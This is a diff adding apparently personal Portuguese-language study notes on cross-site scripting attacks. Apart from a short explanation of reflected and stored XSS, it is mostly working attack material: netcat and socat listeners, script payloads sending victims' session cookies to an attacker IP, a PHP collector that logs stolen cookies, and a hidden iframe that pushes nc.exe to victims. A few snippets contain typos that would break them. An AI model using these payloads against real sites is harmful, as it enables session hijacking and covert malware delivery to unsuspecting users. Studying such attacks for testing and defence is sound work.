@@ -1,0 +1,47 @@
+<script>alert('Hello') </script>
+
+#Verificar na url o script, podendo mainipular 
+
+XSS Refletido: Normalmente adicionado em url e encaminhado para vitima
+
+XSS Stored: Tem maior impacto e fica armazenado na aplicação, infectando a pagina
+	-Pode ser usado para baixar executaveis para o computador da vitima, ou com encaminhamento de reuquisições
+	-Poderia ser usado para roubo de cookie de sessao
+
+
+-Roubando sessao via XSS e recebendo dados de usuarios:
+#No computador atacante:
+nc -lvp 8080
+
+#Para persistir a conexão:
+socat TCP4-LISTEN:8080,reuseaddr,fork -
+
+#No script:
+<script>new image().src="http://<ip_atacante>:8080/; </script>
+
+
+-Subindo um servidor Web para coletar os cookies de sessao em arquivo:
+
+vi coleta.php
+<?php
+$cookie=$GET['cookie'];
+$useragent=$_SERVER['HTTP_USER_AGENT'];
+$file=fopen('cookie.txt','a');
+fwrite($file,"User Agent:$useragent || COOKIE:$cookie \n");
+fclose($file)
+?>
+
+toutch cookie.txt && chmod 777 cookie.txt
+
+
+-Adicionar o script:
+<script>new Image().src="http://192.168.15.112/coleta.php?cookie="+document.cookie; </script>
+
+
+
+---ATAQUE USANDO IFRAME: O usuario faz o download de um arquivo
+
+cp /usr/share/windows-binaries/nc.exe /var/www/html
+
+-Usar o script:
+<iframe src="http://192.168.15.112/nc.exe" height="0" width="0"> </iframe>
